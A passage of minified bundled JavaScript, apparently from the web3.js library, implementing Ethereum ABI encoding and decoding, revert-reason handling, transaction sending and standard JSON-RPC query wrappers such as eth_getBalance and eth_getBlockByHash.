            min: -kp / BigInt(2),
            max: kp / BigInt(2) - BigInt(1)
        }), kp *= BigInt(256);
        Ap.set("int", Ap.get("int256")), Ap.set("uint", Ap.get("uint256"));
        const Ep = BigInt(1) << BigInt(256);

        function Sp(e) {
            let t, n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : pp;
            return t = e < 0 ? (Ep + e).toString(16) : e.toString(16), t = dc(t, 2 * n), Wa(t)
        }

        function Cp(e, t) {
            let n;
            try {
                n = zs(t)
            } catch (Qy) {
                throw new $t("provided input is not number value", {
                    type: e.type,
                    value: t,
                    name: e.name
                })
            }
            const r = Ap.get(e.type);
            if (!r) throw new $t("provided abi contains invalid number datatype", {
                type: e.type
            });
            if (n < r.min) throw new $t("provided input is less then minimum for given type", {
                type: e.type,
                value: t,
                name: e.name,
                minimum: r.min.toString()
            });
            if (n > r.max) throw new $t("provided input is greater then maximum for given type", {
                type: e.type,
                value: t,
                name: e.name,
                maximum: r.max.toString()
            });
            return {
                dynamic: !1,
                encoded: Sp(n)
            }
        }

        function _p(e, t) {
            if (t.length < pp) throw new $t("Not enough bytes left to decode", {
                param: e,
                bytesLeft: t.length
            });
            const n = t.subarray(0, pp),
                r = Ap.get(e.type);
            if (!r) throw new $t("provided abi contains invalid number datatype", {
                type: e.type
            });
            const i = function(e, t) {
                const n = Ga(e),
                    r = BigInt(n);
                return r <= t ? r : r - Ep
            }(n, r.max);
            if (i < r.min) throw new $t("decoded value is less then minimum for given type", {
                type: e.type,
                value: i,
                name: e.name,
                minimum: r.min.toString()
            });
            if (i > r.max) throw new $t("decoded value is greater then maximum for given type", {
                type: e.type,
                value: i,
                name: e.name,
                maximum: r.max.toString()
            });
            return {
                result: i,
                encoded: t.subarray(pp),
                consumed: pp
            }
        }
        const Ip = 32;

        function Pp(e, t) {
            if ("string" === typeof t && t.length % 2 !== 0 && (t += "0"), !Ka(t)) throw new $t("provided input is not valid bytes value", {
                type: e.type,
                value: t,
                name: e.name
            });
            const n = ws(t),
                [, r] = e.type.split("bytes");
            if (r) {
                if (Number(r) > Ip || Number(r) < 1) throw new $t("invalid bytes type. Static byte type can have between 1 and 32 bytes", {
                    type: e.type
                });
                if (Number(r) < n.length) throw new $t("provided input size is different than type size", {
                    type: e.type,
                    value: t,
                    name: e.name
                });
                const i = mp(pp);
                return i.set(n), {
                    dynamic: !1,
                    encoded: i
                }
            }
            const i = Math.ceil(n.length / pp),
                o = mp(pp + i * pp);
            return o.set(Cp({
                type: "uint32",
                name: ""
            }, n.length).encoded), o.set(n, pp), {
                dynamic: !0,
                encoded: o
            }
        }

        function Tp(e, t) {
            const [, n] = e.type.split("bytes");
            let r = Number(n),
                i = t,
                o = 1,
                a = 0;
            if (!r) {
                const e = _p({
                    type: "uint32",
                    name: ""
                }, i);
                r = Number(e.result), a += e.consumed, i = e.encoded, o = Math.ceil(r / pp)
            }
            if (r > t.length) throw new $t("there is not enough data to decode", {
                type: e.type,
                encoded: t,
                size: r
            });
            return {
                result: As(i.subarray(0, r)),
                encoded: i.subarray(o * pp),
                consumed: a + o * pp
            }
        }

        function Bp(e) {
            let t = 0,
                n = 0;
            const r = [],
                i = [];
            for (const o of e) o.dynamic ? t += pp : t += o.encoded.length;
            for (const o of e) o.dynamic ? (r.push(Cp({
                type: "uint256",
                name: ""
            }, t + n)), i.push(o), n += o.encoded.length) : r.push(o);
            return gs(...r.map((e => e.encoded)), ...i.map((e => e.encoded)))
        }

        function Np(e, t) {
            if ("string" === e.type) return function(e, t) {
                if ("string" !== typeof t) throw new $t("invalid input, should be string", {
                    input: t
                });
                return Pp({
                    type: "bytes",
                    name: ""
                }, Rs(t))
            }(0, t);
            if ("bool" === e.type) return function(e, t) {
                let n;
                try {
                    n = Ws(t)
                } catch (Qy) {
                    if (Qy instanceof $n) throw new $t("provided input is not valid boolean value", {
                        type: e.type,
                        value: t,
                        name: e.name
                    })
                }
                return Cp({
                    type: "uint8",
                    name: ""
                }, Number(n))
            }(e, t);
            if ("address" === e.type) return function(e, t) {
                if ("string" !== typeof t) throw new $t("address type expects string as input type", {
                    value: t,
                    name: e.name,
                    type: e.type
                });
                let n = t.toLowerCase();
                if (n.startsWith("0x") || (n = "0x".concat(n)), !Ya(n)) throw new $t("provided input is not valid address", {
                    value: t,
                    name: e.name,
                    type: e.type
                });
                const r = Wa(n),
                    i = mp(pp);
                return i.set(r, xp), {
                    dynamic: !1,
                    encoded: i
                }
            }(e, t);
            if ("tuple" === e.type) return Rp(e, t);
            if (e.type.endsWith("]")) return function(e, t) {
                if (!Array.isArray(t)) throw new $t("Expected value to be array", {
                    abi: e,
                    values: t
                });
                const {
                    size: n,
                    param: r
                } = yp(e), i = t.map((e => Np(r, e))), o = -1 === n, a = i.length > 0 && i[0].dynamic;
                if (!o && t.length !== n) throw new $t("Given arguments count doesn't match array length", {
                    arrayLength: n,
                    argumentsLength: t.length
                });
                if (o || a) {
                    const e = Bp(i);
                    if (o) {
                        const t = Cp({
                            type: "uint256",
                            name: ""
                        }, i.length).encoded;
                        return {
                            dynamic: !0,
                            encoded: i.length > 0 ? gs(t, e) : t
                        }
                    }
                    return {
                        dynamic: !0,
                        encoded: e
                    }
                }
                return {
                    dynamic: !1,
                    encoded: gs(...i.map((e => e.encoded)))
                }
            }(e, t);
            if (e.type.startsWith("bytes")) return Pp(e, t);
            if (e.type.startsWith("uint") || e.type.startsWith("int")) return Cp(e, t);
            throw new $t("Unsupported", {
                param: e,
                value: t
            })
        }

        function Op(e, t) {
            if ("string" === e.type) return function(e, t) {
                const n = Tp({
                    type: "bytes",
                    name: ""
                }, t);
                return {
                    result: Ns(n.result),
                    encoded: n.encoded,
                    consumed: n.consumed
                }
            }(0, t);
            if ("bool" === e.type) return function(e, t) {
                const n = _p({
                    type: "uint8",
                    name: ""
                }, t);
                if (n.result > 1 || n.result < 0) throw new $t("Invalid boolean value encoded", {
                    boolBytes: t.subarray(0, pp),
                    numberResult: n
                });
                return {
                    result: n.result === BigInt(1),
                    encoded: n.encoded,
                    consumed: pp
                }
            }(0, t);
            if ("address" === e.type) return function(e, t) {
                const n = t.subarray(xp, pp);
                if (n.length !== wp) throw new $t("Invalid decoding input, not enough bytes to decode address", {
                    bytes: t
                });
                const r = Ga(n);
                return {
                    result: Qs(r),
                    encoded: t.subarray(pp),
                    consumed: pp
                }
            }(0, t);
            if ("tuple" === e.type) return Mp(e, t);
            if (e.type.endsWith("]")) return function(e, t) {
                let {
                    size: n,
                    param: r
                } = yp(e), i = 0;
                const o = [];
                let a = t;
                if (-1 === n) {
                    const e = _p({
                        type: "uint32",
                        name: ""
                    }, t);
                    n = Number(e.result), i = e.consumed, a = e.encoded
                }
                if (bp(r)) {
                    for (let e = 0; e < n; e += 1) {
                        const t = _p({
                            type: "uint32",
                            name: ""
                        }, a.subarray(e * pp));
                        i += t.consumed;
                        const n = Op(r, a.subarray(Number(t.result)));
                        i += n.consumed, o.push(n.result)
                    }
                    return {
                        result: o,
                        encoded: a.subarray(i),
                        consumed: i
                    }
                }
                for (let s = 0; s < n; s += 1) {
                    const e = Op(r, t.subarray(i));
                    i += e.consumed, o.push(e.result)
                }
                return {
                    result: o,
                    encoded: t.subarray(i),
                    consumed: i
                }
            }(e, t);
            if (e.type.startsWith("bytes")) return Tp(e, t);
            if (e.type.startsWith("uint") || e.type.startsWith("int")) return _p(e, t);
            throw new $t("Unsupported", {
                param: e,
                bytes: t
            })
        }

        function Rp(e, t) {
            var n, r, i;
            let o = !1;
            if (!Array.isArray(t) && "object" !== typeof t) throw new $t("param must be either Array or Object", {
                param: e,
                input: t
            });
            const a = t,
                s = [];
            for (let c = 0; c < (null !== (r = null === (n = e.components) || void 0 === n ? void 0 : n.length) && void 0 !== r ? r : 0); c += 1) {
                const n = e.components[c];
                let r;
                if (Array.isArray(a)) {
                    if (c >= a.length) throw new $t("input param length missmatch", {
                        param: e,
                        input: t
                    });
                    r = Np(n, a[c])
                } else {
                    const o = a[null !== (i = n.name) && void 0 !== i ? i : ""];
                    if (void 0 === o || null === o) throw new $t("missing input defined in abi", {
                        param: e,
                        input: t,
                        paramName: n.name
                    });
                    r = Np(n, o)
                }
                r.dynamic && (o = !0), s.push(r)
            }
            return o ? {
                dynamic: !0,
                encoded: Bp(s)
            } : {
                dynamic: !1,
                encoded: gs(...s.map((e => e.encoded)))
            }
        }

        function Mp(e, t) {
            const n = {
                __length__: 0
            };
            let r = 0;
            if (!e.components) return {
                result: n,
                encoded: t,
                consumed: r
            };
            let i = 0;
            for (const [o, a] of e.components.entries()) {
                let e;
                if (bp(a)) {
                    const n = _p({
                        type: "uint32",
                        name: ""
                    }, t.subarray(r));
                    e = Op(a, t.subarray(Number(n.result))), r += n.consumed, i += e.consumed
                } else e = Op(a, t.subarray(r)), r += e.consumed;
                n.__length__ += 1, n[o] = e.result, a.name && "" !== a.name && (n[a.name] = e.result)
            }
            return {
                encoded: t.subarray(r + i),
                result: n,
                consumed: r + i
            }
        }

        function jp(e) {
            const t = [];
            return e.forEach((e => {
                if (Array.isArray(e)) {
                    const n = jp(e);
                    t.push({
                        type: "tuple",
                        components: n,
                        name: ""
                    })
                } else t.push({
                    type: Hs(e, !0)
                })
            })), t
        }

        function Fp(e, t) {
            if ((null === e || void 0 === e ? void 0 : e.length) !== t.length) throw new $t("Invalid number of values received for given ABI", {
                expected: null === e || void 0 === e ? void 0 : e.length,
                received: t.length
            });
            return Ga(Rp({
                type: "tuple",
                name: "",
                components: vp(e)
            }, t).encoded)
        }

        function Lp(e) {
            try {
                return Ga(Rp({
                    type: "tuple",
                    name: "",
                    components: jp(e)
                }, e).encoded)
            } catch (Qy) {
                throw new $t("Could not infer types from given params", {
                    params: e
                })
            }
        }
        const Dp = (e, t) => Fp([e], [t]),
            Hp = (e, t, n) => {
                try {
                    if (e.length > 0 && (!t || "0x" === t || "0X" === t)) throw new $t("Returned values aren't valid, did it run Out of Gas? You might also see this error if you are not using the correct ABI for the contract you are retrieving data from, requesting data from a block number that does not exist, or querying a node which is not fully synced.");
                    return function(e, t, n) {
                        return Mp({
                            type: "tuple",
                            name: "",
                            components: vp(e)
                        }, Wa(t)).result
                    }(e, "0x".concat(t.replace(/0x/i, "")))
                } catch (r) {
                    throw new $t("Parameter decoding error: ".concat(r.message), {
                        internalErr: r
                    })
                }
            },
            Up = (e, t) => Hp(e, t),
            zp = (e, t) => Up([e], t)[0],
            Gp = e => {
                if ("string" !== typeof e && !Lh(e)) throw new $t("Invalid parameter value in encodeFunctionSignature");
                let t;
                return t = !e || "function" !== typeof e && "object" !== typeof e ? e : Gh(e), _c(t).slice(0, 10)
            },
            qp = ["bool", "string", "int", "uint", "address", "fixed", "ufixed"],
            Qp = (e, t, n) => {
                const r = Array.isArray(n) ? n : [n],
                    i = {},
                    o = {};
                for (const [f, h] of e.entries()) h.indexed ? i[f] = h : o[f] = h;
                const a = t ? Hp(Object.values(o), t) : {
                        __length__: 0
                    },
                    s = r.length - Object.keys(i).length,
                    c = Object.values(i).map(((e, t) => {
                        return qp.some((t => e.type.startsWith(t))) ? (n = e.type, i = r[t + s], "string" === n ? i : zp(n, i)) : r[t + s];
                        var n, i
                    })),
                    l = {
                        __length__: 0
                    };
                let u = 0,
                    d = 0;
                for (const [f, h] of e.entries()) l[f] = "string" === h.type ? "" : void 0, i[f] && (l[f] = c[u], u += 1), o[f] && (l[f] = a[String(d)], d += 1), h.name && (l[h.name] = l[f]), l.__length__ += 1;
                return l
            },
            Wp = (e, t) => {
                if (null === t || void 0 === t ? void 0 : t.data) {
                    let r, i, o;
                    try {
                        const n = t.data.slice(0, 10),
                            a = e.find((e => (e => {
                                if ("string" !== typeof e && !jh(e)) throw new $t("Invalid parameter value in encodeErrorSignature");
                                let t;
                                return t = !e || "function" !== typeof e && "object" !== typeof e ? e : Gh(e), _c(t)
                            })(e).startsWith(n)));
                        (null === a || void 0 === a ? void 0 : a.inputs) && (r = a.name, i = Gh(a), o = Up([...a.inputs], t.data.substring(10)))
                    } catch (n) {
                        console.error(n)
                    }
                    r && t.setDecodedProperties(r, i, o)
                }
            };
        var Vp = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const Zp = (e, t) => {
            var n, r, i, o, a;
            if (e instanceof qt && e.cause instanceof Gt) {
                if (void 0 !== t) {
                    const i = t.filter((e => jh(e)));
                    return Wp(i, e.cause), {
                        reason: e.cause.message,
                        signature: null === (n = e.cause.data) || void 0 === n ? void 0 : n.slice(0, 10),
                        data: null === (r = e.cause.data) || void 0 === r ? void 0 : r.substring(10),
                        customErrorName: e.cause.errorName,
                        customErrorDecodedSignature: e.cause.errorSignature,
                        customErrorArguments: e.cause.errorArgs
                    }
                }
                return {
                    reason: e.cause.message,
                    signature: null === (i = e.cause.data) || void 0 === i ? void 0 : i.slice(0, 10),
                    data: null === (o = e.cause.data) || void 0 === o ? void 0 : o.substring(10)
                }
            }
            if (e instanceof ar && !Array.isArray(null === (a = e.cause) || void 0 === a ? void 0 : a.errors) && void 0 !== e.cause) return e.cause.message;
            throw e
        };

        function Kp(e, t, n) {
            let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : e.defaultReturnFormat;
            return Vp(this, void 0, void 0, (function*() {
                try {
                    return void(yield Am(e, t, e.defaultBlock, r))
                } catch (i) {
                    return Zp(i, n)
                }
            }))
        }
        var Jp = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function Yp(e, t, n, r, i, o) {
            return Jp(this, void 0, void 0, (function*() {
                let a, s = o;
                if (void 0 === s && (void 0 !== r ? s = Zp(r) : e.handleRevert && void 0 !== t && (s = yield Kp(e, t, i))), void 0 === s) a = new un(n);
                else if ("string" === typeof s) a = new cn(s, void 0, n);
                else if (void 0 !== s.customErrorName && void 0 !== s.customErrorDecodedSignature && void 0 !== s.customErrorArguments) {
                    const e = s;
                    a = new ln(e.reason, e.customErrorName, e.customErrorDecodedSignature, e.customErrorArguments, e.signature, n, e.data)
                } else a = new cn(s.reason, s.signature, n, s.data);
                return a
            }))
        }
        const Xp = function(e, t, n) {
            let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : Xe;
            var i, o, a, s, c;
            let l = Object.assign({}, e);
            const u = kc(rh, t, r);
            if ([gh, "allEvents"].includes(l.name)) {
                const e = n.find((e => e.signature === t.topics[0]));
                l = e || {
                    anonymous: !0
                }
            }
            if (l.inputs = null !== (o = null !== (i = l.inputs) && void 0 !== i ? i : e.inputs) && void 0 !== o ? o : [], !l.anonymous) {
                let e = 0;
                (null !== (a = l.inputs) && void 0 !== a ? a : []).forEach((t => {
                    t.indexed && (e += 1)
                })), e > 0 && (null === t || void 0 === t ? void 0 : t.topics) && (null === t || void 0 === t ? void 0 : t.topics.length) !== e + 1 && (l = Object.assign(Object.assign({}, l), {
                    anonymous: !0,
                    inputs: []
                }))
            }
            const d = l.anonymous ? t.topics : (null !== (s = t.topics) && void 0 !== s ? s : []).slice(1);
            return Object.assign(Object.assign({}, u), {
                returnValues: Qp([...null !== (c = l.inputs) && void 0 !== c ? c : []], t.data, d),
                event: l.name,
                signature: !l.anonymous && t.topics && 0 !== t.topics.length && t.topics[0] ? t.topics[0] : void 0,
                raw: {
                    data: t.data,
                    topics: t.topics
                }
            })
        };
        var $p = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class em {
            constructor(e) {
                let {
                    options: t,
                    web3Context: n,
                    promiEvent: r,
                    returnFormat: i
                } = e;
                this.options = {
                    checkRevertBeforeSending: !0
                }, this.options = t, this.web3Context = n, this.promiEvent = r, this.returnFormat = i
            }
            getReceiptWithEvents(e) {
                var t, n;
                const r = Object.assign({}, null !== e && void 0 !== e ? e : {});
                if ((null === (t = this.options) || void 0 === t ? void 0 : t.contractAbi) && r.logs && r.logs.length > 0) {
                    r.events = {};
                    for (const e of r.logs) {
                        const t = Xp(vh, e, null === (n = this.options) || void 0 === n ? void 0 : n.contractAbi, this.returnFormat);
                        t.event && (r.events[t.event] = t)
                    }
                }
                return r
            }
            checkRevertBeforeSending(e) {
                return $p(this, void 0, void 0, (function*() {
                    if (!1 !== this.options.checkRevertBeforeSending) {
                        let t = e;
                        ss(e.data) && ss(e.input) && ss(e.gas) && (t = Object.assign(Object.assign({}, e), {
                            gas: 21e3
                        }));
                        const n = yield Kp(this.web3Context, t, this.options.contractAbi);
                        if (void 0 !== n) throw yield Yp(this.web3Context, e, void 0, void 0, this.options.contractAbi, n)
                    }
                }))
            }
            emitSending(e) {
                this.promiEvent.listenerCount("sending") > 0 && this.promiEvent.emit("sending", e)
            }
            populateGasPrice(e) {
                let {
                    transactionFormatted: t,
                    transaction: n
                } = e;
                var r;
                return $p(this, void 0, void 0, (function*() {
                    let e = t;
                    return !(null === (r = this.options) || void 0 === r ? void 0 : r.ignoreGasPricing) && ss(t.gasPrice) && (ss(n.maxPriorityFeePerGas) || ss(n.maxFeePerGas)) && (e = Object.assign(Object.assign({}, t), yield wh(t, this.web3Context, $e))), e
                }))
            }
            signAndSend(e) {
                let {
                    wallet: t,
                    tx: n
                } = e;
                return $p(this, void 0, void 0, (function*() {
                    if (t) {
                        const e = yield t.signTransaction(n);
                        return Ph(this.web3Context, (() => $p(this, void 0, void 0, (function*() {
                            return Ff(this.web3Context.requestManager, e.rawTransaction)
                        }))), e.transactionHash)
                    }
                    return Ph(this.web3Context, (() => $p(this, void 0, void 0, (function*() {
                        return function(e, t) {
                            return Mf(this, void 0, void 0, (function*() {
                                return e.send({
                                    method: "eth_sendTransaction",
                                    params: [t]
                                })
                            }))
                        }(this.web3Context.requestManager, n)
                    }))))
                }))
            }
            emitSent(e) {
                this.promiEvent.listenerCount("sent") > 0 && this.promiEvent.emit("sent", e)
            }
            emitTransactionHash(e) {
                this.promiEvent.listenerCount("transactionHash") > 0 && this.promiEvent.emit("transactionHash", e)
            }
            emitReceipt(e) {
                this.promiEvent.listenerCount("receipt") > 0 && this.promiEvent.emit("receipt", e)
            }
            handleError(e) {
                let {
                    error: t,
                    tx: n
                } = e;
                var r;
                return $p(this, void 0, void 0, (function*() {
                    let e = t;
                    return e instanceof qt && this.web3Context.handleRevert && (e = yield Yp(this.web3Context, n, void 0, void 0, null === (r = this.options) || void 0 === r ? void 0 : r.contractAbi)), (e instanceof ar || e instanceof qt || e instanceof ln || e instanceof un || e instanceof cn || e instanceof Ln) && this.promiEvent.listenerCount("error") > 0 && this.promiEvent.emit("error", e), e
                }))
            }
            emitConfirmation(e) {
                let {
                    receipt: t,
                    transactionHash: n,
                    customTransactionReceiptSchema: r
                } = e;
                this.promiEvent.listenerCount("confirmation") > 0 && Mh(this.web3Context, this.promiEvent, t, n, this.returnFormat, r)
            }
            handleResolve(e) {
                let {
                    receipt: t,
                    tx: n
                } = e;
                var r, i, o;
                return $p(this, void 0, void 0, (function*() {
                    if (null === (r = this.options) || void 0 === r ? void 0 : r.transactionResolver) return null === (i = this.options) || void 0 === i ? void 0 : i.transactionResolver(t);
                    if (t.status === BigInt(0)) {
                        const e = yield Yp(this.web3Context, n, t, void 0, null === (o = this.options) || void 0 === o ? void 0 : o.contractAbi);
                        throw this.promiEvent.listenerCount("error") > 0 && this.promiEvent.emit("error", e), e
                    }
                    return t
                }))
            }
        }
        var tm = function(e, t, n, r) {
                return new(n || (n = Promise))((function(i, o) {
                    function a(e) {
                        try {
                            c(r.next(e))
                        } catch (Qy) {
                            o(Qy)
                        }
                    }

                    function s(e) {
                        try {
                            c(r.throw(e))
                        } catch (Qy) {
                            o(Qy)
                        }
                    }

                    function c(e) {
                        var t;
                        e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                            e(t)
                        }))).then(a, s)
                    }
                    c((r = r.apply(e, t || [])).next())
                }))
            },
            nm = function(e, t) {
                var n = {};
                for (var r in e) Object.prototype.hasOwnProperty.call(e, r) && t.indexOf(r) < 0 && (n[r] = e[r]);
                if (null != e && "function" === typeof Object.getOwnPropertySymbols) {
                    var i = 0;
                    for (r = Object.getOwnPropertySymbols(e); i < r.length; i++) t.indexOf(r[i]) < 0 && Object.prototype.propertyIsEnumerable.call(e, r[i]) && (n[r[i]] = e[r[i]])
                }
                return n
            };

        function rm(e, t) {
            return tm(this, void 0, void 0, (function*() {
                const n = yield function(e) {
                    return Mf(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "eth_hashrate",
                            params: []
                        })
                    }))
                }(e.requestManager);
                return kc({
                    format: "uint"
                }, n, null !== t && void 0 !== t ? t : e.defaultReturnFormat)
            }))
        }

        function im(e, t) {
            return tm(this, void 0, void 0, (function*() {
                const n = yield function(e) {
                    return Mf(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "eth_gasPrice",
                            params: []
                        })
                    }))
                }(e.requestManager);
                return kc({
                    format: "uint"
                }, n, null !== t && void 0 !== t ? t : e.defaultReturnFormat)
            }))
        }

        function om(e, t) {
            return tm(this, void 0, void 0, (function*() {
                const n = yield function(e) {
                    return Mf(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "eth_maxPriorityFeePerGas",
                            params: []
                        })
                    }))
                }(e.requestManager);
                return kc({
                    format: "uint"
                }, n, null !== t && void 0 !== t ? t : e.defaultReturnFormat)
            }))
        }

        function am(e, t) {
            return tm(this, void 0, void 0, (function*() {
                const n = yield function(e) {
                    return Mf(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "eth_blockNumber",
                            params: []
                        })
                    }))
                }(e.requestManager);
                return kc({
                    format: "uint"
                }, n, null !== t && void 0 !== t ? t : e.defaultReturnFormat)
            }))
        }

        function sm(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultBlock,
                r = arguments.length > 3 ? arguments[3] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const i = rs(n) ? n : kc({
                        format: "uint"
                    }, n, $e),
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["address", "blockNumberOrTag"], [t, n]), e.send({
                                method: "eth_getBalance",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, t, i);
                return kc({
                    format: "uint"
                }, o, null !== r && void 0 !== r ? r : e.defaultReturnFormat)
            }))
        }

        function cm(e, t, n) {
            let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : e.defaultBlock,
                i = arguments.length > 4 ? arguments[4] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const o = kc({
                        format: "uint"
                    }, n, $e),
                    a = rs(r) ? r : kc({
                        format: "uint"
                    }, r, $e),
                    s = yield function(e, t, n, r) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["address", "hex", "blockNumberOrTag"], [t, n, r]), e.send({
                                method: "eth_getStorageAt",
                                params: [t, n, r]
                            })
                        }))
                    }(e.requestManager, t, o, a);
                return kc({
                    format: "bytes"
                }, s, null !== i && void 0 !== i ? i : e.defaultReturnFormat)
            }))
        }

        function lm(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultBlock,
                r = arguments.length > 3 ? arguments[3] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const i = rs(n) ? n : kc({
                        format: "uint"
                    }, n, $e),
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["address", "blockNumberOrTag"], [t, n]), e.send({
                                method: "eth_getCode",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, t, i);
                return kc({
                    format: "bytes"
                }, o, null !== r && void 0 !== r ? r : e.defaultReturnFormat)
            }))
        }

        function um(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : e.defaultBlock,
                n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
                r = arguments.length > 3 ? arguments[3] : void 0;
            return tm(this, void 0, void 0, (function*() {
                let i;
                if (Ka(t)) {
                    const r = kc({
                        format: "bytes32"
                    }, t, $e);
                    i = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["bytes32", "bool"], [t, n]), e.send({
                                method: "eth_getBlockByHash",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, r, n)
                } else {
                    const r = rs(t) ? t : kc({
                        format: "uint"
                    }, t, $e);
                    i = yield Lf(e.requestManager, r, n)
                }
                return kc(th, i, null !== r && void 0 !== r ? r : e.defaultReturnFormat)
            }))
        }

        function dm(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : e.defaultBlock,
                n = arguments.length > 2 ? arguments[2] : void 0;
            return tm(this, void 0, void 0, (function*() {
                let r;
                if (Ka(t)) {
                    const n = kc({
                        format: "bytes32"
                    }, t, $e);
                    r = yield function(e, t) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["bytes32"], [t]), e.send({
                                method: "eth_getBlockTransactionCountByHash",
                                params: [t]
                            })
                        }))
                    }(e.requestManager, n)
                } else {
                    const n = rs(t) ? t : kc({
                        format: "uint"
                    }, t, $e);
                    r = yield function(e, t) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["blockNumberOrTag"], [t]), e.send({
                                method: "eth_getBlockTransactionCountByNumber",
                                params: [t]
                            })
                        }))
                    }(e.requestManager, n)
                }
                return kc({
                    format: "uint"
                }, r, null !== n && void 0 !== n ? n : e.defaultReturnFormat)
            }))
        }

        function fm(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : e.defaultBlock,
                n = arguments.length > 2 ? arguments[2] : void 0;
            return tm(this, void 0, void 0, (function*() {
                let r;
                if (Ka(t)) {
                    const n = kc({
                        format: "bytes32"
                    }, t, $e);
                    r = yield function(e, t) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["bytes32"], [t]), e.send({
                                method: "eth_getUncleCountByBlockHash",
                                params: [t]
                            })
                        }))
                    }(e.requestManager, n)
                } else {
                    const n = rs(t) ? t : kc({
                        format: "uint"
                    }, t, $e);
                    r = yield function(e, t) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["blockNumberOrTag"], [t]), e.send({
                                method: "eth_getUncleCountByBlockNumber",
                                params: [t]
                            })
                        }))
                    }(e.requestManager, n)
                }
                return kc({
                    format: "uint"
                }, r, null !== n && void 0 !== n ? n : e.defaultReturnFormat)
            }))
        }

        function hm(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : e.defaultBlock,
                n = arguments.length > 2 ? arguments[2] : void 0,
                r = arguments.length > 3 ? arguments[3] : void 0;
            return tm(this, void 0, void 0, (function*() {
                const i = kc({
                    format: "uint"
                }, n, $e);
                let o;
                if (Ka(t)) {
                    const n = kc({
                        format: "bytes32"
                    }, t, $e);
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["bytes32", "hex"], [t, n]), e.send({
                                method: "eth_getUncleByBlockHashAndIndex",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, n, i)
                } else {
                    const n = rs(t) ? t : kc({
                        format: "uint"
                    }, t, $e);
                    o = yield function(e, t, n) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["blockNumberOrTag", "hex"], [t, n]), e.send({
                                method: "eth_getUncleByBlockNumberAndIndex",
                                params: [t, n]
                            })
                        }))
                    }(e.requestManager, n, i)
                }
                return kc(th, o, null !== r && void 0 !== r ? r : e.defaultReturnFormat)
            }))
        }

        function pm(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultReturnFormat;
            return tm(this, void 0, void 0, (function*() {
                const r = kc({
                        format: "bytes32"
                    }, t, Xe),
                    i = yield function(e, t) {
                        return Mf(this, void 0, void 0, (function*() {
                            return ps.validate(["bytes32"], [t]), e.send({
                                method: "eth_getTransactionByHash",
                                params: [t]
                            })
                        }))
                    }(e.requestManager, r);
                return ss(i) ? i : lh(i, n, {
                    fillInputAndData: !0
                })
            }))
        }

        function mm(e, t) {
            return tm(this, void 0, void 0, (function*() {
                return (yield function(e) {
                    return Mf(this, void 0, void 0, (function*() {
                        return e.send({
                            method: "eth_pendingTransactions",
                            params: []
                        })
                    }))
                }(e.requestManager)).map((n => lh(n, null !== t && void 0 !== t ? t : e.defaultReturnFormat, {
                    fillInputAndData: !0
                })))
            }))
        }

        function gm(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : e.defaultBlock,
                n = arguments.length > 2 ? arguments[2] : void 0,
                r = arguments.length > 3 ? arguments[3] : void 0;
